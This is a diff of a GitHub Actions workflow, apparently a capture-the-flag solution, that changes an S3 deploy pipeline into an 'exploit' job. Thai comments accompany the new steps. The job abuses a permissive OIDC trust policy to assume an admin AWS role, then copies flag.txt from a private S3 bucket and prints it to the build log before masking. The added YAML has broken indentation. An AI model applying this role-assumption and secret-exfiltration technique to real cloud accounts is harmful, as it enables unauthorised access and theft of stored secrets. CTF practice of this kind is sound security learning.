@@ -1,39 +1,40 @@
-name: Deploy Static Website to S3
+name: Get The Flag
 
 on:
-  workflow_dispatch:
   push:
     branches: [ main ]
+  workflow_dispatch:
 
 permissions:
   id-token: write
   contents: read
 
 jobs:
-  deploy:
+  exploit:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v3
+    
+name: Checkout repository
+    uses: actions/checkout@v3
 
-      - name: Configure AWS credentials via OIDC
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
-          role-session-name: GitHubActions-Backend-${{ github.run_id }}
-          aws-region: "ap-southeast-1"
+    # ขั้นตอนนี้จะสำเร็จ เพราะ Trust Policy อนุญาตให้ Repository ของคุณ Assume Role ได้
+    
+name: Assume Target AWS Role
+    uses: aws-actions/configure-aws-credentials@v4
+    with:
+      role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
+      role-session-name: Hacker-Session-${{ github.run_id }}
+      aws-region: "ap-southeast-1"
 
-      # --- [FIX] THIS IS THE NEW STEP TO BYPASS APT ---
-      - name: Install AWS CLI (Manual Install)
-        run: |
-          curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
-          unzip awscliv2.zip
-          sudo ./aws/install
-
-      # --- [HACK] THIS IS OUR HACKED STEP ---
-      - name: STEAL THE FLAG
-        run: |
-          aws s3 cp s3://oh-i-really-do-care/flag.txt .
-          echo "--- HERE IS THE FLAG ---"
-          cat flag.txt
-          echo "------------------------"
+    # ขั้นตอนการขโมย Flag
+    
+name: Steal and Print the Full Flag
+    run: |
+      echo "Attempting to read the secret flag from S3..."
+      # 1. Copy the flag file from the secret S3 bucket
+      aws s3 cp s3://oh-i-really-do-care/flag.txt .
+      # 2. Print the full content of the file before it is masked
+      echo "--- FLAG CONTENT ---"
+      cat flag.txt 
+      echo "--- END FLAG ---"
